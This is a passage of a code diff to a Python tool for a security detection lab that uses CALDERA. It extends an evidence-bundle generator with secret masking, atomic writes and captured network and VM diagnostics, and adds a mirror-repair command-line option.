     bundle_root = out_dir / f"xdr-lab-evidence-{ts}"
+    evidence_root = bundle_root / "evidence"
     bundle_root.mkdir(parents=True, exist_ok=True)
     copied: list[str] = []
+
+    def _mask_text(text: str) -> str:
+        text = re.sub(r"(?i)(KEY:\s*)[^\s'\"]+", r"\1<redacted>", text)
+        text = re.sub(r"(?i)(api[_-]?key(?:_red)?\s*[:=]\s*)[^\s,'\"]+", r"\1<redacted>", text)
+        text = re.sub(r"(?i)(password\s*[:=]\s*)[^\s,'\"]+", r"\1<redacted>", text)
+        text = re.sub(r"(?i)(token\s*[:=]\s*)[^\s,'\"]+", r"\1<redacted>", text)
+        return text
+
+    def _write_text_atomic(rel: str, text: str) -> None:
+        dest = evidence_root / rel
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        fd, tmp = tempfile.mkstemp(prefix=".tmp-", dir=str(dest.parent), text=True)
+        try:
+            with os.fdopen(fd, "w", encoding="utf-8") as fh:
+                fh.write(_mask_text(text))
+                if not text.endswith("\n"):
+                    fh.write("\n")
+            os.replace(tmp, dest)
+        except Exception:
+            try:
+                os.unlink(tmp)
+            except OSError:
+                pass
+            raise
+        copied.append(str(dest.relative_to(bundle_root)))
+
+    def _write_json_atomic(rel: str, data: Mapping[str, Any]) -> None:
+        _write_text_atomic(rel, json.dumps(data, indent=2, ensure_ascii=False, sort_keys=True) + "\n")
+
+    def _run_capture(rel: str, argv: list[str], *, timeout: int = 30) -> dict[str, Any]:
+        started = utc_now()
+        try:
+            proc = subprocess.run(argv, text=True, capture_output=True, timeout=timeout, check=False)
+            stdout = proc.stdout or ""
+            stderr = proc.stderr or ""
+            rc = int(proc.returncode)
+        except FileNotFoundError as e:
+            stdout, stderr, rc = "", str(e), 127
+        except subprocess.TimeoutExpired as e:
+            stdout = e.stdout if isinstance(e.stdout, str) else ""
+            stderr = e.stderr if isinstance(e.stderr, str) else f"timeout after {timeout}s"
+            rc = 124
+        _write_text_atomic(rel, stdout + (("\n--- stderr ---\n" + stderr) if stderr else ""))
+        return {"argv": argv, "started_utc": started, "exit_code": rc, "artifact": f"evidence/{rel}"}
 
     def _copy_if_exists(src: Path, dest_name: str | None = None) -> None:
         if not src.is_file():
             return
-        dest = bundle_root / (dest_name or src.name)
+        dest = evidence_root / (dest_name or src.name)
         dest.parent.mkdir(parents=True, exist_ok=True)
-        shutil.copy2(src, dest)
-        copied.append(str(dest.relative_to(bundle_root)))
+        if src.suffix in (".json", ".jsonl", ".log", ".txt", ""):
+            _write_text_atomic(dest.relative_to(evidence_root).as_posix(), src.read_text(encoding="utf-8", errors="replace"))
+        else:
+            shutil.copy2(src, dest)
+            copied.append(str(dest.relative_to(bundle_root)))
+            return
 
     log_path = xdr_root / "logs" / "caldera-orchestration.jsonl"
-    _copy_if_exists(log_path)
-    _copy_if_exists(xdr_root / "logs" / "vm-manager.log")
-    state_dest = bundle_root / "runtime-state"
+    _copy_if_exists(log_path, "caldera/caldera-orchestration.jsonl")
+    _copy_if_exists(xdr_root / "logs" / "vm-manager.log", "runtime/vm-manager.log")
+    state_dest = evidence_root / "runtime" / "state"
     state_dest.mkdir(parents=True, exist_ok=True)
     for name in ("scenario.json", "caldera.json", "mirror.json", "nat.json", "snapshots.json"):
-        _copy_if_exists(stated / name, f"runtime-state/{name}")
+        _copy_if_exists(stated / name, f"runtime/state/{name}")
 
-    guidance_path = bundle_root / "operator-capture-guidance.txt"
-    guidance_path.write_text("\n".join(operator_capture_guidance_lines()) + "\n", encoding="utf-8")
-    copied.append("operator-capture-guidance.txt")
+    command_results: list[dict[str, Any]] = []
+    command_results.append(_run_capture("network/ovs-vsctl-show.txt", ["ovs-vsctl", "show"]))
+    command_results.append(_run_capture("network/virsh-list-all.txt", ["virsh", "list", "--all"]))
+    lab = cfg.get("_lab_vms") if isinstance(cfg.get("_lab_vms"), dict) else load_lab_vms_json(xdr_root)
+    domif: dict[str, Any] = {}
+    vms = lab.get("vms") if isinstance(lab.get("vms"), dict) else {}
+    for vm in sorted(str(k) for k in vms.keys()):
+        rec = _run_capture(f"network/domiflist/{vm}.txt", ["virsh", "domiflist", vm])
+        domif[vm] = rec
+    _write_json_atomic(f"network/virsh-domiflist-{ts}.json", {"created_utc": utc_now(), "domains": domif})
+    command_results.append(_run_capture("network/iptables-save.txt", ["iptables-save"], timeout=45))
+    command_results.append(_run_capture("mirror/mirror-verify.txt", [str(xdr_root / "scripts" / "xdr-lab-vm-manager.sh"), "mirror", "verify"]))
+    command_results.append(_run_capture("validation/sensor-verify.txt", [str(xdr_root / "scripts" / "xdr-lab-vm-manager.sh"), "sensor", "verify"]))
+    command_results.append(_run_capture("validation/validate-strict.txt", [str(xdr_root / "bootstrap" / "validate-appliance.sh"), "--strict"], timeout=180))
+
+    client = make_caldera_client(cfg)
+    agents = fetch_agents(client, log_path) if probe_api_authenticated(client, log_path) else []
+    _write_json_atomic(f"caldera/agent-list-{ts}.json", {"created_utc": utc_now(), "agents": agents})
+    _write_json_atomic(f"operations/caldera-operation-{ts}.json", build_operation_status_report(xdr_root, stated, cfg, log_path))
+
+    _write_text_atomic("runtime/operator-capture-guidance.txt", "\n".join(operator_capture_guidance_lines()) + "\n")
 
     summary = build_runtime_quick_summary(xdr_root, stated, cfg, log_path, refresh=False)
     manifest_path = bundle_root / "bundle-manifest.json"
@@ -7431,8 +8055,26 @@ def generate_evidence_bundle(xdr_root: Path, stated: Path, out_dir: Path, cfg: d
         "bundle_dir": str(bundle_root),
         "xdr_root": str(xdr_root),
         "files_copied": copied,
+        "command_results": command_results,
         "runtime_summary": summary,
     }
+    _write_text_atomic("runtime/runtime-summary.txt", json.dumps(summary, indent=2, ensure_ascii=False, sort_keys=True) + "\n")
+    summary_lines = [
+        "XDR Lab evidence bundle",
+        f"created_utc={manifest['created_utc']}",
+        f"xdr_root={xdr_root}",
+        "",
+        "Structure:",
+        "  evidence/runtime/",
+        "  evidence/network/",
+        "  evidence/caldera/",
+        "  evidence/mirror/",
+        "  evidence/validation/",
+        "  evidence/operations/",
+        "",
+        "Credential/API key masking: enabled",
+    ]
+    _write_text_atomic("summary.txt", "\n".join(summary_lines) + "\n")
     manifest_path.write_text(json.dumps(manifest, indent=2, ensure_ascii=False, sort_keys=True) + "\n", encoding="utf-8")
 
     return {
@@ -7849,6 +8491,7 @@ def cmd_runtime_preview(
         return 0
     print_scenario_run_preflight_stdout(
         pf,
+        cfg=cfg,
         operation_name=op_name,
         adversary_id=adv,
         group=rs.group,
@@ -7909,6 +8552,11 @@ def build_parser() -> argparse.ArgumentParser:
         "--dry-run",
         action="store_true",
         help="Skip CALDERA PUT and libvirt snapshot (same effect as XDR_LAB_DRY_RUN=1 for this command)",
+    )
+    pr.add_argument(
+        "--repair-mirror",
+        action="store_true",
+        help="Repair stale/missing OVS mirror state before live run (enabled by default for non-dry-run)",
     )
 
     sub.add_parser(
